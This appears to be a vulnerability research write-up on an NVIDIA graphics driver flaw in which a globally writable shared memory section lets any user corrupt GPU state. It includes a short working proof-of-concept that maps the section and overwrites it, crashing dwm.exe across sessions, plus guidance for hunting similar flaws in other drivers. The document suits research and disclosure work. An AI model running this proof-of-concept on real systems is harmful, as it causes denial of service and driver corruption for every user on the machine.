# GreenSection — NVIDIA Shared Section Memory Corruption 0day

## Target
- **Binary:** NVIDIA user-mode graphics drivers (nvoglv64.dll, etc.)
- **Type:** Cross-user/cross-session memory corruption
- **Privilege impact:** Crash dwm.exe (Desktop Window Manager), corrupt GPU state cross-session

## Vulnerability class
Insecure shared memory section with Everyone READ/WRITE access. Any user can corrupt GPU
driver state for all users on the system, including session 0 services.

## Technique

### The shared section
NVIDIA creates a global shared section:
```
\BaseNamedObjects\{52813408-3561-4705-820a-2b3b78be92ba}
```
**Security descriptor:** Everyone has READ/WRITE access.

### Attack
```cpp
NtOpenSection(&hSection, SECTION_MAP_WRITE | SECTION_MAP_READ,
    &oa /* \BaseNamedObjects\{52813408-...} */)
NtMapViewOfSection(hSection, NtCurrentProcess(), &baseAddress,
    0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READWRITE)
memset(baseAddress, 0x41, viewSize)  // corrupt entire section
```

### Impact
- OOB write crash: `nvoglv64!DrvPresentBuffers+0xbcdf8`
- Affects any process using Vulkan or OpenGL, including `dwm.exe`
- Cross-session: Session 0 services with GPU access are affected
- No elevation — this is DoS/corruption, not code execution (as demonstrated)

## Hunt generalization
Shared sections are a common GPU driver pattern. Look for:
1. `NtCreateSection` / `ZwCreateSection` with `OBJ_PERMANENT` flag in driver code
2. Named objects in `\BaseNamedObjects\` with weak DACLs
3. `!sd` in WinDbg on discovered section objects to check access
4. GPU drivers from AMD, Intel, Qualcomm may have similar patterns
5. Any `PAGE_READWRITE` section shared between different privilege levels

### Quick check command
```
# From WinDbg kernel debug or livekd
!object \BaseNamedObjects
# Then check security descriptors of GPU-related sections
!sd <address> 1
```

### API surface for hunting
- `NtQueryDirectoryObject` to enumerate `\BaseNamedObjects\`
- `NtOpenSection` + `NtQuerySecurityObject` to check DACLs
- Crash by writing arbitrary data → if it crashes a SYSTEM process, file as DoS
- If the section contains function pointers or vtables → potential code execution
